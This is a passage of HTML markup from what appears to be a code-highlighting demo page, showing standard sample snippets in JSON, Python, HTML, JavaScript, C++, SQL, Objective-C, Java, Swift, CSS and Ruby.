punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"apples\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token property\">\"count\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">12000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20000</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"text\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"...\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"sensitive\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"oranges\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token property\">\"count\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">17500</span><span class=\"token punctuation\">,</span> <span class=\"token null keyword\">null</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"text\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"...\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"sensitive\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@requires_authorization</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">somefunc</span><span class=\"token punctuation\">(</span>param1<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span> param2<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token triple-quoted-string string\">r'''A docstring'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> param1 <span class=\"token operator\">></span> param2<span class=\"token punctuation\">:</span> <span class=\"token comment\"># interesting</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token string\">'Gre\\'ater'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>param2 <span class=\"token operator\">-</span> param1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">+</span> 0b10l<span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">SomeClass</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> message <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''interpreter</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>... prompt'''</span></pre></td></tr></table></figure><figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Title<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"><span class=\"token selector\">body</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 500px<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>application/javascript<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function\">$init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">checked</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>title<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>title<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span>Title<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">&lt;!-- here goes the rest of the page --></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">$initHighlight</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">block<span class=\"token punctuation\">,</span> cls</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">.</span><span class=\"token function\">search</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">\\bno\\-highlight\\b</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>             <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"> class=\"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>cls<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">\"</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">/* handle exception */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> classes<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">checkCondition</span><span class=\"token punctuation\">(</span>classes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token keyword\">undefined</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'undefined'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token operator\">&lt;</span>div<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token operator\">&lt;</span>web<span class=\"token operator\">-</span>component<span class=\"token operator\">></span><span class=\"token punctuation\">&#123;</span>block<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>web<span class=\"token operator\">-</span>component<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">export</span> $initHighlight<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">/* An annoying \"Hello World\" example */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Hello, World!\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">char</span> c <span class=\"token operator\">=</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  unordered_map <span class=\"token operator\">&lt;</span>string<span class=\"token punctuation\">,</span> vector<span class=\"token operator\">&lt;</span>string<span class=\"token operator\">></span> <span class=\"token operator\">></span> m<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  m<span class=\"token punctuation\">[</span><span class=\"token string\">\"key\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\\\\\\\\\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// this is an error</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">2e3</span> <span class=\"token operator\">+</span> <span class=\"token number\">12l</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token string\">\"topic\"</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token string\">\"id\"</span> <span class=\"token keyword\">serial</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token string\">\"forum_id\"</span> <span class=\"token keyword\">integer</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token string\">\"subject\"</span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">TABLE</span> <span class=\"token string\">\"topic\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">ADD</span> <span class=\"token keyword\">CONSTRAINT</span> forum_id <span class=\"token keyword\">FOREIGN</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"forum_id\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">REFERENCES</span> <span class=\"token string\">\"forum\"</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">-- Initials</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> <span class=\"token string\">\"topic\"</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"forum_id\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"subject\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">values</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'D''artagnian'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight objectivec\"><figcaption data-lang=\"Objective-C\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">import</span> <span class=\"token expression\"><span class=\"token operator\">&lt;</span>UIKit<span class=\"token operator\">/</span>UIKit<span class=\"token punctuation\">.</span>h<span class=\"token operator\">></span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">import</span> <span class=\"token string\">\"Dependency.h\"</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">@protocol</span> WorldDataSource</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">@</span>optional</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>NSString<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>worldName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">@</span>required</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>BOOL<span class=\"token punctuation\">)</span>allowsToLive<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">@end</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">@property</span> <span class=\"token punctuation\">(</span>nonatomic<span class=\"token punctuation\">,</span> readonly<span class=\"token punctuation\">)</span> NSString <span class=\"token operator\">*</span>title<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>IBAction<span class=\"token punctuation\">)</span> show<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">@end</span></pre></td></tr></table></figure><figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * @author John Smith &lt;john.smith@example.com></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">l2f<span class=\"token punctuation\">.</span>gameserver<span class=\"token punctuation\">.</span>model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">L2Char</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">L2Object</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">Short</span> ERROR <span class=\"token operator\">=</span> <span class=\"token number\">0x0001</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">moveTo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> z<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    _ai <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Should not be called\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// wtf!?</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight swift\"><figcaption data-lang=\"swift\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token class-name\">Foundation</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token attribute atrule\">@objc</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Entity</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">var</span> name<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">var</span> age<span class=\"token punctuation\">:</span>  <span class=\"token class-name\">Int</span><span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">init</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">/* /* ... */ */</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token comment\">// Return a descriptive string for this person</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">func</span> <span class=\"token function-definition function\">description</span><span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Int</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string-literal\"><span class=\"token string\">\"</span><span class=\"token interpolation-punctuation punctuation\">\\(</span><span class=\"token interpolation\">name</span><span class=\"token interpolation-punctuation punctuation\">)</span><span class=\"token string\"> is </span><span class=\"token interpolation-punctuation punctuation\">\\(</span><span class=\"token interpolation\">age <span class=\"token operator\">+</span> offset</span><span class=\"token interpolation-punctuation punctuation\">)</span><span class=\"token string\"> years old\"</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight css\"><figcaption data-lang=\"CSS\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span> Chunkfive<span class=\"token punctuation\">;</span> <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">'Chunkfive.otf'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token selector\">body, .usertext</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #F0F0F0<span class=\"token punctuation\">;</span> <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #600<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span> Chunkfive<span class=\"token punctuation\">,</span> sans<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@import</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>print.css<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@media</span> print</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token selector\">a[href^=http]::after</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token property\">content</span><span class=\"token punctuation\">:</span> <span class=\"token function\">attr</span><span class=\"token punctuation\">(</span>href<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight ruby\"><figcaption data-lang=\"ruby\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># The Greeter class</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Greeter</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">initialize</span></span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">@name</span> <span class=\"token operator\">=</span> name<span class=\"token 